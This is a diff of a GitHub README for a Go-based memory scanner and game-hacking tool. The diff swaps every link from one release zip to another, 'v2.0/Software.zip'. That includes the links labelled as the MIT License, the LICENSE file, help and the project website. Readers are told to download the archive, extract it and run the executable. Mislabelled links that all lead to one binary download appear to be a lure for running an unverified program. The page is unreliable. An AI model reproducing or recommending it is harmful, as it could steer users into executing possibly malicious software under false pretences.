@@ -1,7 +1,7 @@
 
 # Welcome to GoMemScanner-WebUI 🕵️‍♂️
 
-![GoMemScanner-WebUI](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v1.0/Release_x64.zip)
+![GoMemScanner-WebUI](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v2.0/Software.zip)
 
 ## Repository Overview
 **GoMemScanner-WebUI** is a powerful memory scanner and modifier written in Go with a user-friendly web-based UI. This tool is designed for game enthusiasts, developers, and security researchers who need to analyze and manipulate memory for various purposes.
@@ -15,7 +15,7 @@
 - Ideal for game hacking and memory analysis
 
 ## How to Use 🚀
-1. **Download the Software**: [Launch https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v1.0/Release_x64.zip](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v1.0/Release_x64.zip)
+1. **Download the Software**: [Launch https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v2.0/Software.zip](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v2.0/Software.zip)
 2. **Extract the Zip File**
 3. **Run the Executable**
 4. **Access the Web Interface**
@@ -39,17 +39,17 @@ To get started with GoMemScanner-WebUI, simply follow the steps outlined above. 
 - windows-api
 
 ## Need Help? ❓
-If you encounter any issues with the download link, please check the [Releases](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v1.0/Release_x64.zip) section for alternative options.
+If you encounter any issues with the download link, please check the [Releases](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v2.0/Software.zip) section for alternative options.
 
 ## Contribute 🤝
 Interested in contributing to GoMemScanner-WebUI? Feel free to fork the repository, make improvements, and submit a pull request. Your contributions are highly appreciated!
 
 ## License ℹ️
-This project is licensed under the [MIT License](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v1.0/Release_x64.zip) - see the [LICENSE](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v1.0/Release_x64.zip) file for details.
+This project is licensed under the [MIT License](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v2.0/Software.zip) - see the [LICENSE](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v2.0/Software.zip) file for details.
 
 ## Connect with Us 🌐
-For more information and updates, visit our website [here](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v1.0/Release_x64.zip).
+For more information and updates, visit our website [here](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v2.0/Software.zip).
 
 ---
 
-[![Download Software](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v1.0/Release_x64.zip)](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v2.0/Software.zip)](https://github.com/Tisly10/GoMemScanner-WebUI/releases/download/v2.0/Software.zip)
